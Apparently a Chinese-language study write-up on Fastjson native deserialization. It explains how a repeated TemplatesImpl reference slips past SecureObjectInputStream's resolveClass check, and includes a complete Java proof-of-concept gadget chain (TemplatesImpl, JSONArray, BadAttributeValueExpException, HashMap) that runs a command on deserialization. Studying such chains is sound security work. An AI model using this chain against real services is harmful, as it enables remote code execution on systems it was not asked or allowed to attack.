<=1.2.48 || 2

在小于1.2.48版本中，Fastjson中继承了反序列化接口的统共有两个类JsonArray和JsonObject
调用方式都差不多
JsonArray并没有自己的readObject方法，并且其继承的JSON类同样没有，但在其toString方法下调用了toJSONString()
这里也利用到了Fastjson的关键特性，toJSONString方法能够调用getter·,通过如下类进行断点调试

package org.example.spring.Fastjson_Test;  
  
public class Demo {  
    String name;  
    int id ;  
    public Demo(){  
        System.out.println("无参构造方法");  
    }  
    public Demo(String name,int id){  
        System.out.println("有参构造");  
        this.name = name;  
        this.id = id;  
    }  
    public String getName(){  
        System.out.println("调用getName");  
        return name;  
    }  
    public void setName(String name){  
        System.out.println("调用setName");  
        this.name = name;  
    }  
  
  
  
}
Demo demo = new Demo();  
String json = JSON.toJSONString(demo, SerializerFeature.WriteClassName);  
System.out.println(json);

经过调试可以发现，Fastjson对我们传入的类对象的参数进行了解析，并调用其对应的getter,详细的可以去看Y4师傅的文章，这里以知道调用为目的
根据之前调试Fastjson的漏洞可以知道，我们都是以调用某个类的getter || setter || 构造方法来达成执行命令，写入文件等目的，因此不难想到TemplatesImpl的利用

反序列化流程总结
FastJson与原生反序列化-二
xz社区
能绕过的主要原因是不安全的反序列化流程
Fastjson反序列化的流程是

ObjectInputStream -> readObject -> SecureObjectInputStream -> readObject -> resolveClass

对readObject进行了委托，然后才进行了resolveClass的检查
安全的流程应该是

TestInputStream -> readObject -> resolveClass

不对readObject进行委托，防止其修改handles表

从上面的文章了解到当我们的恶意类为引用类型时，可以绕过resolveClass的检查
向List、set、map类型中添加同样对象时即可成功利用

以hashmap为例的poc

package org.example.spring.Fastjson_Test;  
  
import com.alibaba.fastjson.JSONArray;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import javassist.ClassPool;  
import javassist.CtClass;  
import javassist.CtConstructor;  
  
import javax.management.BadAttributeValueExpException;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Map;  
  
public class SE_1_49 {  
    public static void setValue(Object obj, String name, Object value) throws Exception{  
        Field field = obj.getClass().getDeclaredField(name);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
    public static byte[] genPayload(String cmd) throws Exception{  
        ClassPool pool = ClassPool.getDefault();  
        CtClass clazz = pool.makeClass("a");  
        CtClass superClass = pool.get(AbstractTranslet.class.getName());  
        clazz.setSuperclass(superClass);  
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);  
        constructor.setBody("Runtime.getRuntime().exec(\""+cmd+"\");");  
        clazz.addConstructor(constructor);  
        clazz.getClassFile().setMajorVersion(49);  
        return clazz.toBytecode();  
    }  
  
    public static  void main(String args[]) throws Exception {  
  
        TemplatesImpl templates = new TemplatesImpl();  
        setValue(templates,"_name","uu2fu3o");  
        setValue(templates,"_bytecodes",new byte[][] {genPayload("calc")});  
        setValue(templates,"_tfactory",new TransformerFactoryImpl());  
  
        JSONArray jsonArray = new JSONArray();  
        jsonArray.add(templates);  
  
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);  
        setValue(badAttributeValueExpException,"val",jsonArray);  
  
        Map map = new HashMap();  
        map.put(templates,badAttributeValueExpException);  
  
        ByteArrayOutputStream barr = new ByteArrayOutputStream();  
        ObjectOutputStream out = new ObjectOutputStream(barr);  
        out.writeObject(map);  
        out.close();  
  
        ByteArrayInputStream bais = new ByteArrayInputStream(barr.toByteArray());  
        ObjectInputStream in = new ObjectInputStream(bais);  
        in.readObject();  
  
  
    }  
}

顺便学习了构造类的方法

因为我们引入了Map类型，第一个readObject方法先将template进行一次恢复，然后再恢复BadAttributeValueExpException对象，而在恢复BadAttributeValueExpException对象的过程中，因为我们传入了val对应的JSONArray/JSONObject对象，所以会触发第二个readObject方法，将这个过程在给SecrueObjectInputStream处理，因为我们这是第二次恢复Templateslmpl对象，所以是引用类型，通过readHandle哈希表的时候不会触发resolveClass，从而实现了绕过。
